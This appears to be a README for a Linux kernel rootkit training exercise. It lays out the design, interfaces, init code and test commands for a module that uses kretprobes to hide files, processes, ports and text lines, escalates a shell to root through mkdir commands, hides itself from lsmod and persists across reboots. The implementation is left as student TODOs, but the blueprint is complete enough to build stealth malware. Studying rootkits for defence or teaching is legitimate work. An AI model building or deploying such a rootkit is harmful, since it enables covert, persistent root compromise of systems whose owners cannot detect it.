# M01: Covert Local Control

M01 combines the local control mechanisms from L00 through L14.
Each mechanism works alone; integration adds shared state, registration order,
partial-init rollback, and reverse-order cleanup.
A failure in one subsystem must not leave commands or probes owned by another
subsystem registered.

The result is one module with sixteen symmetric control commands, four target
lists, and seven kretprobes.

## What you will observe

One loaded module accepts the complete symmetric control vocabulary:

```text
rklings.h.f.secret  -- hide file     rklings.u.f.secret  -- restore it
rklings.h.i.1234    -- hide PID      rklings.u.i.1234    -- restore it
rklings.h.p.4444    -- hide port     rklings.u.p.4444    -- restore it
rklings.h.c.token   -- hide lines    rklings.u.c.token   -- restore them
```

## Workspace

```text
exercises/M01-local-control
├── Kbuild
├── core
│   ├── dispatch.c
│   ├── escalation.c
│   ├── filter.c
│   ├── init.c
│   ├── module.c
│   └── target.c
└── include
    └── rootkit.h
```

The header and `Kbuild` define the shared contract.
Complete the TODOs in the six `core` files, following the ownership order below.

## Architecture

```text
  mkdir rklings.h.f.secret
    |
    v
  dispatch.c: strip "rklings.", longest-prefix match "h.f"
    |
    v
  filter.c: cmd_hide_file("secret") --> rk_target_add(&file_targets, "secret")

  ls /tmp
    |
    v
  getdents64 kretprobe (filter.c)
    |
    v
  walk dirent buffer, rk_target_match each d_name
    |
    v
  memmove to remove "secret", copy_to_user, regs_set_return_value
    |
    v
  ls shows everything except "secret"
```

## Init ordering

`rk_init` registers commands first (table-driven), then probes (loop over
array):

```c
static struct kretprobe *probes[] = {
    &rk_mkdir_probe, &rk_mkdirat_probe,
    &rk_getdents_probe, &rk_read_probe,
    &rk_tcp4_probe, &rk_tcp6_probe,
    &rk_inet_diag_probe,
};
static int nr_probes;

ret = rk_cmds_register(init_cmds, ARRAY_SIZE(init_cmds));
ret = rk_escalate_init();
ret = rk_module_cmds_init();
ret = rk_filter_init();
for (i = 0; i < ARRAY_SIZE(probes); i++) {
    ret = register_kretprobe(probes[i]);
    if (ret) goto fail_probes;
    nr_probes++;
}

fail_probes:
    while (nr_probes--) unregister_kretprobe(probes[nr_probes]);
```

Exit reverses: unhide the module and unregister probes in reverse.

## Subsystem ownership

Each file registers only its own commands.
No file reaches into another subsystem's business:

| Owner        | Commands                               |
| ------------ | -------------------------------------- |
| init.c       | ping, status                           |
| escalation.c | e                                      |
| module.c     | persist, unpersist, h.m, u.m           |
| filter.c     | h.f, u.f, h.i, u.i, h.c, u.c, h.p, u.p |

## Implement it

Seven files compose the module; the workspace provides the shared
infrastructure:

| File                | Responsibility                                    |
| ------------------- | ------------------------------------------------- |
| `include/rootkit.h` | Shared types, externs, declarations               |
| `core/init.c`       | module_init/exit, goto chain, ping/status         |
| `core/dispatch.c`   | Command registry, mkdir/mkdirat kretprobes        |
| `core/escalation.c` | Immediate parent-shell and explicit-PID elevation |
| `core/module.c`     | Persistence, module hiding                        |
| `core/target.c`     | Spinlock-protected target list                    |
| `core/filter.c`     | getdents64 + ksys_read + tcp seq_show kretprobes  |

```make
ccflags-y := -I$(src)/include
obj-m += rklings.o
rklings-y := core/init.o core/dispatch.o core/escalation.o \
             core/module.o core/target.o core/filter.o
```

The dispatcher owns command routing, while each subsystem owns its state and
registration table.
That boundary keeps command syntax separate from the hook that implements it.

## Useful interfaces

```c
// Command dispatch (dispatch.c)
typedef int (*rk_handler_t)(const char *arg);
struct rk_cmd_entry { const char *key; rk_handler_t handler; };

int rk_cmd_register(const char *key, rk_handler_t handler);
int rk_cmds_register(const struct rk_cmd_entry *cmds, int count);
int rk_dispatch(const char *name);

// Target list (target.c)
struct rk_target_list { spinlock_t lock; char targets[32][64]; int count; };
void rk_target_init(struct rk_target_list *list);
int  rk_target_add(struct rk_target_list *list, const char *name);
int  rk_target_remove(struct rk_target_list *list, const char *name);
int  rk_target_unhide(struct rk_target_list *list, const char *arg);
bool rk_target_match(struct rk_target_list *list, const char *name);
bool rk_line_matches(struct rk_target_list *list, const char *line, int len);

// Subsystem init (each owns a static cmd table)
int rk_escalate_init(void);
int rk_module_cmds_init(void);
int rk_filter_init(void);
```

All 16 mkdir commands:

| Command              | Action                                 |
| -------------------- | -------------------------------------- |
| `rklings.e`          | Elevate the shell that invoked `mkdir` |
| `rklings.e.<pid>`    | Elevate the selected PID immediately   |
| `rklings.ping`       | Log pong                               |
| `rklings.status`     | Log state                              |
| `rklings.persist`    | Write /etc/modules-load.d entry        |
| `rklings.unpersist`  | Remove persistence                     |
| `rklings.h.m`        | Hide module from lsmod                 |
| `rklings.u.m`        | Unhide module                          |
| `rklings.h.f.<name>` | Hide file from ls                      |
| `rklings.u.f.<name>` | Unhide file by value                   |
| `rklings.h.i.<pid>`  | Hide PID from ps                       |
| `rklings.u.i.<pid>`  | Unhide PID by value                    |
| `rklings.h.c.<str>`  | Hide lines from reads                  |
| `rklings.u.c.<str>`  | Unhide content by value                |
| `rklings.h.p.<port>` | Hide port from ss                      |
| `rklings.u.p.<port>` | Unhide port by value                   |

Target removal matches only the exact supplied value.
File concealment matches prefixes; PID and port concealment match exact values.
Content concealment removes the whole matching line from ordinary non-executable
file reads.

## Test it

Build and load as root, then test as student:

```
$ mkdir rklings.e && id
uid=0(root)

$ touch /tmp/secret && mkdir rklings.h.f.secret
$ ls /tmp/ | grep secret
(no output)
$ cat /tmp/secret
(works, file still exists)

$ nc -l -p 4444 &
$ mkdir rklings.h.p.4444
$ grep -i ':115C ' /proc/net/tcp
(no output)
$ curl localhost:4444
(connects, port still listening)

$ mkdir rklings.h.m
$ lsmod | grep rklings
(no output)

$ mkdir rklings.persist
$ cat /etc/modules-load.d/rklings.conf
rklings
```

## Validate

```
$ ./rklings validate M01
  [+] module loaded
  [+] 16 commands registered
  [+] escalation works (self and PID)
  [+] file hidden from ls, still accessible
  [+] PID hidden from ps, still running
  [+] content hidden from cat, still in file
  [+] port hidden from procfs and ss, still listening
  [+] module hidden from lsmod
  [+] persistence writes and clears
  [+] clean unload after unhide
  PASS
```

## Next

The complete local module works when it is already inside a VM.
D00 starts outside a fresh target and makes you gain access, become root,
transfer the module, and deploy it yourself.
